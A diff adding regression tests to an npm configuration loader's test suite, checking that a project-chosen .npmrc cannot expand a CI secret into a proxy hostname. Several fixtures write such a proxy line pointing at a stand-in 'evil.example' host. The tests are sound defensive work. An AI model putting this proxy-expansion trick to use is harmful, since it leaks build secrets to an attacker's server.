@@ -15,19 +15,23 @@ const SECRET = "SECRETVALUE0123456789";
 
 /**
  * A project directory and a user .npmrc in a temporary directory, with an environment that cannot
- * reach the developer's own ~/.npmrc.
+ * reach the developer's own ~/.npmrc. The user .npmrc is `.npmrc` in the account home folder that
+ * the loader is given in place of the operating system account's, so it is the user's own file.
  * @param {{ project?: string, user?: string, env?: Record<string, string> }} files
  */
 async function fixture({ project, user, env = {} }) {
   const directory = await temporaryDirectory("calavera-npm-config-");
   const cwd = join(directory, "project");
+  const accountHome = join(directory, "account");
   await mkdir(cwd);
+  await mkdir(accountHome);
   if (project !== undefined) await writeFile(join(cwd, ".npmrc"), project);
-  const userconfig = join(directory, "user.npmrc");
+  const userconfig = join(accountHome, ".npmrc");
   if (user !== undefined) await writeFile(userconfig, user);
   return {
     directory,
     cwd,
+    accountHome,
     env: { npm_config_userconfig: userconfig, ...env },
     scope: SCOPE,
   };
@@ -891,4 +895,156 @@ test("registryUrl is the artifact scope's registry, then the default registry, t
     (await loadNpmRegistryOptions(await fixture({}))).registryUrl,
     "https://registry.npmjs.org/",
   );
+});
+
+// #1186: `${VAR}` expands only in the user's own ~/.npmrc, in the account home folder. A project
+// .npmrc `userconfig=./evil.npmrc` reaches Calavera as npm_config_userconfig, so a proxy written as
+// `http://${CI_SECRET}.evil.example/` in that file would otherwise send the secret to the
+// repository's host.
+const SECRET_PROXY = "CISECRET0123456789";
+
+test("a proxy with a variable in a user .npmrc outside the account home is ignored, and the warning names the key only", async () => {
+  const context = await fixture({ env: { CI_SECRET: SECRET_PROXY } });
+  const chosen = join(context.cwd, "evil.npmrc");
+  await writeFile(chosen, "https-proxy=http://${CI_SECRET}.evil.example:8080/\n");
+  const result = await loadNpmRegistryOptions({
+    ...context,
+    env: { ...context.env, npm_config_userconfig: chosen },
+  });
+  assert.equal(result.options.httpsProxy, undefined);
+  assert.deepEqual(result.warnings, [
+    "Ignored https-proxy in the user .npmrc: Calavera expands variables only in your own .npmrc in your account's home folder and in environment variables, never in a file that a variable or a project file names.",
+  ]);
+  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
+});
+
+test("a literal proxy in a user .npmrc outside the account home still applies, because only expansion is restricted", async () => {
+  const context = await fixture({});
+  const chosen = join(context.cwd, "other.npmrc");
+  await writeFile(chosen, "https-proxy=http://proxy.example.com:8080/\n");
+  const { options, warnings } = await loadNpmRegistryOptions({
+    ...context,
+    env: { npm_config_userconfig: chosen },
+  });
+  assert.equal(options.httpsProxy, "http://proxy.example.com:8080/");
+  assert.deepEqual(warnings, []);
+});
+
+test("under npm exec, the expanded copy npm exports from a chosen user .npmrc proxy is not used", async () => {
+  const context = await fixture({
+    project: "userconfig=./evil.npmrc\n",
+    env: { CI_SECRET: SECRET_PROXY },
+  });
+  const chosen = join(context.cwd, "evil.npmrc");
+  await writeFile(chosen, "https-proxy=http://${CI_SECRET}.evil.example:8080/\n");
+  // The shape npm 11 exports for this project (probed with npm exec): the chosen file and the
+  // proxy it expanded.
+  const result = await loadNpmRegistryOptions({
+    ...context,
+    env: {
+      CI_SECRET: SECRET_PROXY,
+      npm_command: "exec",
+      npm_config_local_prefix: context.cwd,
+      npm_config_userconfig: chosen,
+      npm_config_https_proxy: `http://${SECRET_PROXY}.evil.example:8080/`,
+    },
+  });
+  assert.equal(result.options.httpsProxy, undefined);
+  assert.match(
+    result.warnings.join("\n"),
+    /^Ignored https-proxy in the user \.npmrc: Calavera expands variables only in your own/m,
+  );
+  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
+});
+
+test("the environment a real npm exec creates for a project userconfig does not carry the expanded proxy into the options", async (t) => {
+  const execFileAsync = promisify(execFile);
+  const context = await fixture({ project: "userconfig=./evil.npmrc\n" });
+  await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
+  await writeFile(
+    join(context.cwd, "evil.npmrc"),
+    "https-proxy=http://${CI_SECRET}.evil.example:8080/\n",
+  );
+  const home = join(context.directory, "home");
+  await mkdir(home);
+  // Start from an environment without npm_config_* and with an isolated home, so the developer's
+  // own settings do not leak in.
+  const clean = Object.fromEntries(
+    Object.entries(process.env).filter(([name]) => !/^npm_/i.test(name)),
+  );
+  let output;
+  try {
+    ({ stdout: output } = await execFileAsync(
+      "npm",
+      ["exec", "--offline", "--", "node", "-p", "JSON.stringify(process.env)"],
+      { cwd: context.cwd, env: { ...clean, HOME: home, CI_SECRET: SECRET_PROXY } },
+    ));
+  } catch (error) {
+    t.skip(`npm exec is not available: ${error.code ?? error.message}`);
+    return;
+  }
+  const captured = JSON.parse(output);
+  // npm resolves the temporary folder's symbolic links, such as /var to /private/var on macOS.
+  assert.match(captured.npm_config_userconfig, /[\\/]project[\\/]evil\.npmrc$/);
+  assert.equal(captured.npm_config_https_proxy, `http://${SECRET_PROXY}.evil.example:8080/`);
+  const result = await loadNpmRegistryOptions({ ...context, env: captured });
+  assert.equal(result.options.httpsProxy, undefined);
+  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
+});
+
+test("the account home folder comes from os.userInfo(), not HOME", async () => {
+  const directory = await temporaryDirectory("calavera-npm-config-account-home-");
+  const home = join(directory, "home");
+  const account = join(directory, "account");
+  const project = join(directory, "project");
+  for (const folder of [home, account, project]) await mkdir(folder);
+  const npmrc = "https-proxy=http://${PROXY_HOST}:8080/\n";
+  await writeFile(join(home, ".npmrc"), npmrc);
+  await writeFile(join(account, ".npmrc"), npmrc);
+  // A child process with a stubbed os.userInfo, so the real account's ~/.npmrc is never read. It
+  // reports booleans only, never a value.
+  const script = join(directory, "probe.mjs");
+  const loader = new URL("../src/npm-config.js", import.meta.url).href;
+  await writeFile(
+    script,
+    `import os from "node:os";
+import { syncBuiltinESMExports } from "node:module";
+let stubbed = false;
+os.userInfo = () => {
+  stubbed = true;
+  // userInfo throws for an account without a password database entry.
+  if (!process.env.STUB_ACCOUNT_HOME) throw new Error("no account");
+  return { homedir: process.env.STUB_ACCOUNT_HOME, username: "probe", uid: -1, gid: -1, shell: null };
+};
+syncBuiltinESMExports();
+const { loadNpmRegistryOptions } = await import(${JSON.stringify(loader)});
+const { options } = await loadNpmRegistryOptions({
+  cwd: process.env.PROBE_CWD,
+  env: { HOME: process.env.PROBE_HOME, PROXY_HOST: "proxy.example.com" },
+});
+console.log(JSON.stringify({ stubbed, expanded: options.httpsProxy === "http://proxy.example.com:8080/" }));
+`,
+  );
+  const run = async (/** @type {string} */ accountHome) =>
+    JSON.parse(
+      (
+        await promisify(execFile)(process.execPath, [script], {
+          env: {
+            PATH: process.env.PATH,
+            STUB_ACCOUNT_HOME: accountHome,
+            PROBE_HOME: home,
+            PROBE_CWD: project,
+            // Under Stryker, the child runs the same mutant as this test.
+            ...(process.env.__STRYKER_ACTIVE_MUTANT__
+              ? { __STRYKER_ACTIVE_MUTANT__: process.env.__STRYKER_ACTIVE_MUTANT__ }
+              : {}),
+          },
+        })
+      ).stdout,
+    );
+  // HOME names a folder that is not the account's, as a Yarn 4 .env.yarn can make it.
+  assert.deepEqual(await run(account), { stubbed: true, expanded: false });
+  assert.deepEqual(await run(home), { stubbed: true, expanded: true });
+  // Without an account home, no user file expands variables, and the loader still works.
+  assert.deepEqual(await run(""), { stubbed: true, expanded: false });
 });
